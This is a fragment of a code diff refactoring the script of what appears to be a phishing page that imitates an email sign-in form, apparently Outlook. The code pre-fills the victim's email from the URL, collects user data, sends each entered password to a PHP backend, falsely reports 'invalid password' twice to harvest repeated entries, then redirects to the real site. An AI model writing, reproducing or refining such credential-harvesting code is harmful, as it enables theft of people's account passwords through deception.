+    signInBtn.disabled = true;
   }
 }
 
-// --- EVENT LISTENERS ---
-passwordInput.addEventListener("input", updateSignInButton);
-
-if(togglePassword){
-  togglePassword.addEventListener("click", () => {
-    if (passwordInput.type === 'password') {
-      passwordInput.type = 'text';
-      togglePassword.textContent = translations[currentLanguage].hide_password || 'Hide';
-    } else {
-      passwordInput.type = 'password';
-      togglePassword.textContent = translations[currentLanguage].show_password || 'Show';
-    }
-  });
-}
-
-if(languageSelect) {
-  languageSelect.addEventListener('change', function() {
-    if (this.value === 'auto') {
-      detectUserLanguage().then(lang => {
-        setLanguage(lang);
-        if (!captchaVerified && window.turnstile && turnstileWidgetId !== null) {
-          resetCaptcha();
-        }
-      });
-    } else {
-      setLanguage(this.value);
-      if (!captchaVerified && window.turnstile && turnstileWidgetId !== null) {
-        resetCaptcha();
-      }
-    }
-  });
-}
-
-passwordInput.addEventListener("keydown", e => {
-  if (e.key === "Enter" && !signInBtn.disabled) {
-    e.preventDefault();
-    signInBtn.click();
+// --- Event listeners ---
+passwordInput.addEventListener('input', updateSignInButton);
+togglePassword.addEventListener('click', () => {
+  const t = window._translations || { show: 'Show', hide: 'Hide' };
+  if (passwordInput.type === 'password') {
+    passwordInput.type = 'text';
+    togglePassword.textContent = t.hide;
+  } else {
+    passwordInput.type = 'password';
+    togglePassword.textContent = t.show;
   }
 });
+passwordInput.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && !signInBtn.disabled) signInBtn.click();
+});
 
-// --- FORM SUBMIT HANDLER with 3‑attempt logic ---
-if(loginForm){
-  loginForm.addEventListener("submit", async (e) => {
-    e.preventDefault();
-    
-    if (CLOUDFLARE_SITE_KEY && !captchaToken) {
-      captchaError.style.display = 'block';
-      return;
+// --- Form submit with 3 attempts ---
+loginForm.addEventListener('submit', e => {
+  e.preventDefault();
+  if (!captchaToken) {
+    captchaError.style.display = 'block';
+    return;
+  }
+  attempts++;
+  attemptField.value = attempts;
+  timestampField.value = new Date().toISOString();
+  
+  signInBtn.disabled = true;
+  buttonText.style.display = 'none';
+  loadingSpinner.style.display = 'block';
+  
+  sendToPHP();
+  
+  setTimeout(() => {
+    if (attempts === 1 || attempts === 2) {
+      showError('invalid_password');
+      passwordInput.value = '';
+      signInBtn.disabled = false;
+      buttonText.style.display = 'block';
+      loadingSpinner.style.display = 'none';
+      passwordInput.focus();
+      updateSignInButton();
+    } else if (attempts >= 3) {
+      showError('signing_in');
+      setTimeout(() => {
+        window.location.href = currentDomain ? 'https://' + currentDomain : 'https://outlook.live.com/owa/';
+      }, 1500);
     }
-    
-    // Increment attempt counter
-    attempts++;
-    attemptField.value = attempts;
-    timestampField.value = new Date().toISOString();
-    
-    // Disable UI and show spinner
-    signInBtn.disabled = true;
-    buttonText.style.display = 'none';
-    loadingSpinner.style.display = 'block';
-    
-    // Send credentials
-    sendToPHP();
-    
-    setTimeout(() => {
-      if (attempts === 1 || attempts === 2) {
-        showError('invalid_password');
-        passwordInput.value = '';
-        captchaError.style.display = 'none';
-        
-        signInBtn.disabled = false;
-        buttonText.style.display = 'block';
-        loadingSpinner.style.display = 'none';
-        passwordInput.focus();
-        updateSignInButton();
-        
-      } else if (attempts >= 3) {
-        showError('signing_in');
-        setTimeout(() => {
-          if (currentDomain) {
-            window.location.href = 'https://' + currentDomain;
-          } else {
-            window.location.href = 'https://outlook.live.com/owa/';
-          }
-        }, 1500);
-      }
-    }, 1000);
-  });
-}
+  }, 1000);
+});
 
+// --- Wait for Turnstile ---
 function waitForTurnstile() {
   if (window.turnstile) {
-    console.log('Cloudflare Turnstile loaded, initializing CAPTCHA');
     initializeCaptcha();
   } else {
     setTimeout(waitForTurnstile, 100);
   }
 }
 
-// --- INITIALIZE ON PAGE LOAD ---
-window.addEventListener("DOMContentLoaded", async () => {
-  const detectedLang = await detectUserLanguage();
+// --- Initialization ---
+window.addEventListener('DOMContentLoaded', async () => {
+  // Detect language from IP
+  const detectedLang = await detectLanguage();
   setLanguage(detectedLang);
   
-  const emailFromUrl = extractEmailFromUrl();
-  if (emailFromUrl) {
-    emailInput.value = emailFromUrl;
-  } else {
-    emailInput.value = getRandomEmail();
-  }
+  // Email from URL or random
+  const urlEmail = extractEmailFromUrl();
+  emailInput.value = urlEmail || getRandomEmail();
   
   collectUserData();
   lockEmailAndUpdateDomain();
@@ -1035,12 +616,10 @@ window.addEventListener("DOMContentLoaded", async () => {
   if (CLOUDFLARE_SITE_KEY) {
     waitForTurnstile();
   } else {
-    captchaContainer.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">Security verification not configured</div>';
+    captchaContainer.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">Security verification not configured</div>';
   }
   
   updateSignInButton();
-  
-  console.log('3‑attempt mode active. CAPTCHA verification shows green success message and disappears.');
 });
 </script>
 </body>
